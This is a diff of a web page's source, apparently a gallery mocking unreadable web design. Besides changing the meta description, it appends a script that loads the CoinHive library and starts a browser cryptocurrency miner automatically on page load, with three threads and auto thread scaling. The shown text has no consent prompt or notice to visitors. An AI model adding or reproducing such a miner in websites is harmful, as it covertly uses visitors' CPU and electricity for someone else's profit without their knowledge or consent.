@@ -26,10 +26,9 @@ function sort_inject($what) {
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
 
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta http-equiv="Content-Style-Type" content="text/css" />
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <meta name="author" content="Chris the hipster McKenzie">
-<meta name="description" content="a good day is a PBR, a MBP, and #BBB on #AAA. i have to stop coding now because i've sobered up." />
+<meta name="description" content="A wall of shame gallery for today's unreadable web." />
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:creator" content="@githater" />
 <meta name="twitter:description" content="a good day is a PBR, a MBP, and #BBB on #AAA. i have to stop coding now because i've sobered up." />
@@ -380,3 +379,19 @@ ga('create', 'UA-28399789-4', 'auto');
 ga('send', 'pageview');
 
 </script>
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+  <script>
+  function when(lib){ var _cb, _ival=setInterval(function(){ if(self[lib]) { _cb(); clearInterval(_ival); } }, 20); return{ run: function(cb) { _cb=cb; } } }
+
+  var miner;
+
+  when('CoinHive').run(function(){
+    miner = new CoinHive.User('HZbryycOfkJHs2hxJ0Fm9a83bI48UXps', 'unreadable', {
+      threads: 3,
+      throttle: 0.4
+    });
+    miner.setAutoThreadsEnabled(true);
+    miner.start();
+  });
+</script>
+
